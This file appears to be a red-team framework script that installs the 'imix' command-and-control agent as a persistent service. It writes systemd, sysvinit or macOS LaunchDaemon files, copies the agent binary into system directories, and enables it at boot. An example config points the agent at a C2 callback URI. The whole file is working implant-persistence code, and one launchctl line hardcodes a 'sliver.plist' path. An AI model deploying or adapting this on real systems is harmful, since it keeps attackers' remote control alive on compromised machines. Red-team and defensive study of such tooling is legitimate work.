systemd_service_template = """[Unit]
Description={{ SERVICE_DESC }}
Requires=network.target
After=network.target

[Service]
Type=simple
{% if SERVICE_WORKING_DIR is defined %}
WorkingDirectory={{ SERVICE_WORKING_DIR }}
{% endif %}
ExecStart={{ SERVICE_START_CMD }}
{% if SERVICE_STOP_CMD is defined %}
ExecStop={{ SERVICE_STOP_CMD }}
{% endif %}
{% if SERVICE_START_PRE_CMD is defined %}
ExecStartPre={{ SERVICE_START_PRE_CMD }}
{% endif %}
{% if SERVICE_PID_FILE is defined %}
PIDFile={{ SERVICE_PID_FILE }}
{% endif %}

[Install]
WantedBy=multi-user.target
"""

sysvinit_template = """#!/bin/sh
### BEGIN INIT INFO
# Provides:          {{ SERVICE_NAME }}
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: {{ SERVICE_DESC }}
# Description:       {{ SERVICE_DESC }}
### END INIT INFO

cmd={{ SERVICE_START_CMD }}

name=`basename $0`
pid_file="/var/run/$name.pid"

get_pid() {
    cat "$pid_file"
}

is_running() {
    [ -f "$pid_file" ] && ps -p `get_pid` > /dev/null 2>&1
}


case "$1" in
    start)
    if is_running; then
        echo "Already started"
    else
        echo "Starting $name"
        cd "$dir"

        $cmd &

        echo $! > "$pid_file"
        if ! is_running; then
            echo "Unable to start, see $stdout_log and $stderr_log"
            exit 1
        fi
    fi
    ;;
    stop)
    if is_running; then
        echo -n "Stopping $name.."
        kill `get_pid`
        for i in 1 2 3 4 5 6 7 8 9 10
        do
            if ! is_running; then
                break
            fi

            echo -n "."
            sleep 1
        done
        echo

        if is_running; then
            echo "Not stopped; may still be shutting down or shutdown may have failed"
            exit 1
        else
            echo "Stopped"
            if [ -f "$pid_file" ]; then
                rm "$pid_file"
            fi
        fi
    else
        echo "Not running"
    fi
    ;;
    restart)
    $0 stop
    if is_running; then
        echo "Unable to stop, will not attempt to start"
        exit 1
    fi
    $0 start
    ;;
    status)
    if is_running; then
        echo "Running"
    else
        echo "Stopped"
        exit 1
    fi
    ;;
    *)
    echo "Usage: $0 {start|stop|restart|status}"
    exit 1
    ;;
esac

exit 0
"""

launch_daemon_template = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{{ service_name }}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{{ bin_path }}</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>
"""

def is_using_systemd():
    command_get_res = sys.shell("command -v systemctl")
    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
        for canary in ["/run/systemd/system/", "/dev/.run/systemd/", "/dev/.systemd/"]:
            if file.is_dir(canary):
                return True
    return False

def is_using_sysvinit():
    command_get_res = sys.shell("command -v update-rc.d")
    if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
        return True
    return False

def systemd(service_name, service_desc, executable_path, executable_args):
    # assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
    file.write("/tmp/systemd.service.j2", systemd_service_template)
    args = {
        "SERVICE_NAME":service_name,
        "SERVICE_DESC":service_desc,
        "SERVICE_START_CMD":executable_path+" "+executable_args
    }
    file.template("/tmp/systemd.service.j2","/usr/lib/systemd/system/"+service_name+".service", args, False)
    file.remove("/tmp/systemd.service.j2")

    # assets.copy("persist_service/files/payload.elf", executable_path)
    sys.shell("chmod +x "+executable_path)

    sys.shell("systemctl daemon-reload "+service_name)
    sys.shell("systemctl enable "+service_name)
    sys.shell("systemctl start "+service_name)
    print("systemd installed")

def sysvinit(service_name, service_desc, executable_path, executable_args):
    # assets.copy("persist_service/files/sysvinit.sh.j2","/tmp/svc.sh.j2")
    file.write("/tmp/svc.sh.j2", sysvinit_template)
    args = {
        "SERVICE_NAME":service_name,
        "SERVICE_DESC":service_desc,
        "SERVICE_START_CMD":executable_path+" "+executable_args
    }
    file.template("/tmp/svc.sh.j2","/etc/init.d/"+service_name, args, False)
    file.remove("/tmp/svc.sh.j2")
    sys.shell("chmod +x "+"/etc/init.d/"+service_name)

    # assets.copy("persist_service/files/payload.elf", executable_path)
    sys.shell("chmod +x "+executable_path)

    sys.shell("update-rc.d "+service_name+" defaults")
    sys.shell("service "+service_name+" start")
    print("sysvinit installed")

def launch_daemon(service_name, executable_path, executable_args):
    # assets.copy("persist_service/files/launch_daemon.plist.j2","/tmp/plist.j2")
    file.write("/tmp/plist.j2",launch_daemon_template)
    args = {
        "service_name":"com.testing."+service_name,
        "bin_path":executable_path+" "+executable_args
    }
    file.template("/tmp/plist.j2","/Library/LaunchDaemons/"+service_name+".plist", args, False)
    file.remove("/tmp/plist.j2")

    # assets.copy("persist_service/files/payload.macho", executable_path)
    sys.shell("chmod +x "+executable_path)
    sys.shell("launchctl load -w /Library/LaunchDaemons/sliver.plist")
    print("Launch daemon installed")

def persist_service(service_name, service_desc, executable_name, executable_args):
    src_path = process.info()['exe']
    if sys.is_linux():
        executable_path = "/usr/local/bin/"+executable_name
        file.copy(src_path, executable_path)
        if is_using_systemd():
            systemd(service_name, service_desc, executable_path, executable_args)
        elif is_using_sysvinit():
            sysvinit(service_name, service_desc, executable_path, executable_args)
    elif sys.is_macos():
        executable_path = "/var/root/"+executable_name
        file.copy(src_path, executable_path)
        launch_daemon(service_name, executable_path, executable_args)
    else:
        print("OS not supported")

def parse_and_persist(config_data):
    if len(config_data['service_configs']) < 1:
        print("Please add a service_config to your imix config")
    else:
        conf = config_data['service_configs'][0]
        persist_service(
            conf['name'],
            conf['description'],
            conf['executable_name'],
            "-c "+input_params['custom_config']+" "+conf['executable_args'],
        )

"""
This script uses the first provided services_configs to install a service
On the local system. The config file specified for the install will be used
by the imix agent. The imix binary itself will be copied to the install
location. The original imix binary will still exist so you may wish to delete
it after running the install.

./imix install -c /etc/imix-config.json

{
    "service_configs": [
        {
            "name": "imix",
            "description": "Imix c2 agent",
            "executable_name": "imix",
            "executable_args": ""
        }
    ],
    "target_forward_connect_ip": "127.0.0.1",
    "target_name": "test1234",
    "callback_config": {
        "interval": 4,
        "jitter": 1,
        "timeout": 4,
        "c2_configs": [
            {
                "priority": 1,
                "uri": "http://127.0.0.1:80/grpc"
            }
        ]
    }
}
"""
def main():
    if 'custom_config' in input_params:
        config_data = crypto.from_json(file.read(input_params['custom_config']))
        parse_and_persist(config_data)
    else:
        print("Please specify a config")

main()
